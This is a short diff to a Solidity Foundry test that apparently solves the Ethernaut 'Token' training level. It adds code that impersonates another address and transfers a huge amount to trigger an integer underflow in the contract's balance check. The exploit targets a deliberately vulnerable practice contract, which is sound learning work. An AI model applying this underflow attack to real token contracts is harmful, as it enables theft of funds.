@@ -33,6 +33,18 @@ contract TokenTest is DSTest {
         // LEVEL ATTACK //
         //////////////////
 
+        // Become "someone" else to transfer money to EoA
+        vm.startPrank(address(10));
+
+        // Transfer with "X" > 20, to cause underflow in "require" statement
+        uint256 amountToTransfer = type(uint256).max - 21;
+
+        ethernautToken.transfer(eoaAddress, amountToTransfer);
+
+        vm.stopPrank();
+
+        vm.startPrank(eoaAddress);
+
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
